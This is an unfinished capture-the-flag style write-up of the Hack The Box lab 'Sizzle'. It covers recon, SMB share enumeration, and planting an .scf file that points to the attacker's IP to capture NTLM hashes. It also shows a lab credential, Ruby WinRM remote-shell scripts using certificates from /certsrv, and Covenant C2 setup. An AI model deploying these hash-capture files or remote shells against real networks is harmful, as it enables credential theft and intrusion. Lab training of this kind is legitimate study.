# Report - Sizzle - HTB

- Author: Henry Post
- Target: Sizzle (HTB)
- Target IP: 10.129.54.76
- Attacker IP: 10.10.14.145
- Date: 03/01/2026

## Executive Summary



### Recommendations

 

## Resources

- a
- b
- c

## Recon

We first get the ports, then run a service scan.

```sh
ports=$(nmap -p- --min-rate=1000 -T4 10.129.54.76 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 
# 21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49668,49670,49672,49686,49687,49691,49694,49709,49729,49747


nmap -p$ports -sC -sV 10.129.54.76
<<EOF
- 21/ftp
- 53/dns
- 80/http
- 135/msrpc
- 139/netbios-ssn
- 389/ldap
- 443/https
- kerberos
- a bunch more ldap ports
- 9389/mc-nmf (.net message framing)
- more RPC
EOF
```

Okay. Using a guide because apparently sizzle is insanely difficult.

http://10.129.54.76 - Neat gif of some bacon. :P

```sh

gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -u http://10.129.54.76/

# Nothing interesting.
```

Let's try FTP.

According to the guide,

> Anonymous login was allowed on FTP but it had no contents.

```sh
ftp 10.129.54.76
# No files
```

Next is SMB enumeration with a NULL session.

```sh
smbclient -N -L \\\\10.129.56.6
<<EOF

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        Department Shares Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Operations      Disk      
        SYSVOL          Disk      Logon server share 


EOF

# We find a few interesting shares...

mount -t cifs -o rw,username=guest,password= '//10.129.56.6/Department Shares' /mnt

<<EOF
┌──(kali㉿kali)-[~]
└─$ ls /mnt    
 Accounting   Banking         Devops    HR        Infrastructure   Legal   Marketing   Sales      Tax     ZZ_ARCHIVE
 Audit        CEO_protected   Finance   Infosec   IT              'M&A'   'R&D'        Security   Users

EOF

# There's a good number of different folders. None of them contain anything useful, though.
```

We make a script to find writeable directories.

```sh
#!/bin/bash 
list=$(find /mnt -type d)
for d in $list 
do 
	touch $d/x 2>/dev/null 
	if [ $? -eq 0 ] 
	then 
		echo $d " is writable" 
	fi
done
```

According to our guide, Users/Public and ZZ_ARCHIVE are writeable.

So, now our guide is talking about AD CertEnroll.

Apparently it's accessible at http://10.129.56.6/certsrv , but that's protected by username and password.

Okay! Black magic, to me. We implant an `.scf` file that causes the victim to send some magic back to "Responder", I'm assuming that's some C2 tool.

> As we found a few writable folders earlier we could implant an .scf file so that it sends us the user’s hashes when he opens the share.

Note that the attacker's IP is currently 10.10.14.145 .

pwn.scf:
```toml
[Shell]
Command=2
IconFile=\\10.10.14.145\share\pwn.ico
[Taskbar]
Command=ToggleDesktop
```

```sh
cp pwn.scf /mnt/Users/Public 
cp pwn.scf /mnt/ZZ_ARCHIVE
```

So...this is bad. I can't continue because I, for some reason, cannot write to the SMB share. I have to skip this step.

The password is `Ashare1972`. Username is `HTB\amanda`.

Next step is to login via WinRM.

connect.rb:

```rb
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new( 
  endpoint: 'https://10.129.56.6:5985/wsman',
  transport: :ssl,
  user: 'amanda',
  password: 'Ashare1972',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```

This fails, because "the server expects certificate based auth".

We need to create a cert and get it signed using `/certsrv`...

```sh
openssl genrsa -des3 -out amanda.key 2048 # create private key
# password is password
openssl req -new -key amanda.key -out amanda.csr # create csr
```

We select "Request a cert" then "Advanced certificate request.".

![](Pasted%20image%2020260805213341.png)

We download it as base64 encoded.

![](Pasted%20image%2020260805213452.png)

We then change our script slightly.

amanda.rb:
```rb
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new( 
  endpoint: 'https://10.129.56.6:5986/wsman',
  transport: :ssl,
  :client_cert => 'certnew.cer',
  :client_key => 'amanda.key',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```

We run it:

```bash
rlwrap ruby amanda.rb
```

## Non-root access

We get non-root access.

![](Pasted%20image%2020260805213840.png)


According to the guide, we need to use "Covenant" to enumerate Active Directory. And "Elite".

Our attacker IP is 10.10.14.145 (`ip a`, `tun0`.)

```sh
# build covenant docker image
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
docker build -t covenant .

# run covenant
docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v `pwd`/Data:/app/Data covenant --username AdminUser --computername 0.0.0.0
# can login with AdminUser:password at https://127.0.0.1:7443


# another terminal
# build elite docker image
git clone --recurse-submodules https://github.com/cobbr/Elite
cd Elite/Elite
docker build -t elite .

# run elite
docker run -it --rm --name elite -v `pwd`/Data:/app/Data elite --username AdminUser --computername 10.10.14.145
```

Okay. Bad news. Sizzle is from 2019. The tool "Elite" seems to not work due to outdated docker images... I don't think I should keep going in a lab with so many issues.

## Root access

.
## Proof

### Local proof

- `ip a`/`ifconfig`
- `whoami`
- `hostname`
- `date`
- `cat local.txt`
(IMG_PLACEHOLDER)

### Root proof

- `ip a`/`ifconfig`
- `whoami`
- `hostname`
- `date`
- `cat proof.txt`
(IMG_PLACEHOLDER)
